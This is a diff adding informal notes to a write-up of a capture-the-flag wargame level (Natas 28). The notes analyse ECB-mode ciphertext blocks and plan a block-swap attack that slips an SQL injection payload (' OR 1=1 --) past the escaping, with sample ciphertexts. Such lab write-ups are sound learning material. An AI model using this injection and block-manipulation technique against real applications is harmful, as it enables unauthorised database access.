@@ -216,3 +216,44 @@ $u = "natas28" + $padding + "x"
 ```
 in powershell
 
+#### l28.
+### observe:
+
+2.the context of encrypted strings have exactly same prefix.
+3. when input string are pretty same but in different longs(like different nums of A):\
+
+<img width="1600" height="353" alt="image" src="https://github.com/user-attachments/assets/13b31e38-3dd6-4ac7-adbf-b76f737cde31" />
+at least 10 chars to make second part change.\
+and >= 13 chars, we always have same pre&suffix.\
+
+4.in base64 trying, decoded middle, %ò*rbT¤fù¯S, 16 long, so the block should be 16\
+5. two test about rear val, `a,b,c` or `' ; \`:\
+```
+a:  G+glEae6W/1XjA7vRm21n  NyEco/c+J2TdR0Qp8dcjP  IkA4mnOUKh8BvERzIoyMYt  c4pf+0pFACRndRda5Za71v  NN8znGntzhH2ZQu87WJwI
+b:  G+glEae6W/1XjA7vRm21n  NyEco/c+J2TdR0Qp8dcjP  KaJ+w3LEi9VL2x96EIV7z3  c4pf+0pFACRndRda5Za71v  NN8znGntzhH2ZQu87WJwI
+c:  G+glEae6W/1XjA7vRm21n  NyEco/c+J2TdR0Qp8dcjP  I1ZuexNCnLbVB/YkQXe5JO  c4pf+0pFACRndRda5Za71v  NN8znGntzhH2ZQu87WJwI
+':  G+glEae6W/1XjA7vRm21n  NyEco/c+J2TdR0Qp8dcjP  IWJ2pwLjKxd0ddiQ3a1c5l  stdkbwCSkbjZzJR1Froznc  qM9OYQkTq645oGdhkgSlo
+":  G+glEae6W/1XjA7vRm21n  NyEco/c+J2TdR0Qp8dcjP  IWJ2pwLjKxd0ddiQ3a1c5l  e0uzFQTQyTJF5uPUK3I8gM  qM9OYQkTq645oGdhkgSlo
+\:  G+glEae6W/1XjA7vRm21n  NyEco/c+J2TdR0Qp8dcjP  IWJ2pwLjKxd0ddiQ3a1c5l  fN5woKhSkQjlY0g5eVSYnc  qM9OYQkTq645oGdhkgSlo
+```\
+6. notice in 10 chars, they always have same suffix.\
+
+### orient:
+`';\` may get escaped, like insert `/` or `'` in front; change input `A*9+'` into 'A*9+'or\`
+if insert guessing are correct, 4th block are still our code, a `'`.\
+
+if our injection are in 4th block, then try to swap 3rd block by a "good conten", else it would not work.\
+send `AAAAAAAAA' OR 1=1 -- ` to get form like:\
+`[known good header] [block we know contains a / to escape our SQL injection] [SQL injection and trailer]`
+
+### observe:
+`AAAAAAAAA/' OR 1=1 -- `inject this, get \
+`G+glEae6W/1XjA7vRm21n NyEco/c+J2TdR0Qp8dcjP IWJ2pwLjKxd0ddiQ3a1c5l WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K`\
+3rd part need to swap\
+by query 10 space, get: \
+`G+glEae6W/1XjA7vRm21n NyEco/c+J2TdR0Qp8dcjP ItlMM3qTizkRB5P2zYxJsb c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=`\
+`ItlMM3qTizkRB5P2zYxJsb` swap this in 3rd block.\
+`JfIqcn9iVBmkZvmvU4kfmy` or this in blue frame in the pic\
+#### but this would not work unless attach suffix from 10 chars long query:\
+`4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=`\
+
